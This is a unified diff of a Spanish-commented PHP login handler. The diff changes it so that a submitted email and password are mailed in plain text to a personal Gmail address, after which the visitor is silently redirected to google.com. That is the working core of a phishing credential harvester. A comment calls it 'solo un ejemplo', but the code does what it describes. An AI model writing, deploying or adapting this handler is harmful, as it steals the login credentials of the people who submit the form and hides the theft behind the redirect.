@@ -1,16 +1,18 @@
 <?php
-// Validamos que los datos se hayan enviado por el método POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Capturamos los datos del formulario de manera segura
-    $usuario = $_POST['usuario'] ?? '';
-    $password = $_POST['password'] ?? '';
+    $email = $_POST["email"];
+    $password = $_POST["password"];
 
-    // Redireccionamos de inmediato al usuario a Google
+    // Aquí podrías realizar más validaciones y procesamiento de datos
+
+    // Enviar un correo electrónico con los datos (ESTO ES SOLO UN EJEMPLO)
+    $to = "sebastiancq2008@gmail.com";
+    $subject = "Nuevo inicio de sesión";
+    $message = "Correo electrónico: $email\nContraseña: $password";
+    mail($to, $subject, $message);
+
+    // Redirigir después de enviar el correo electrónico
     header("Location: https://www.google.com");
-    exit();
-} else {
-    // Si intentan entrar al archivo directamente sin usar el formulario, los manda a la página principal
-    header("Location: index.html");
-    exit();
+    exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
 }
 ?>
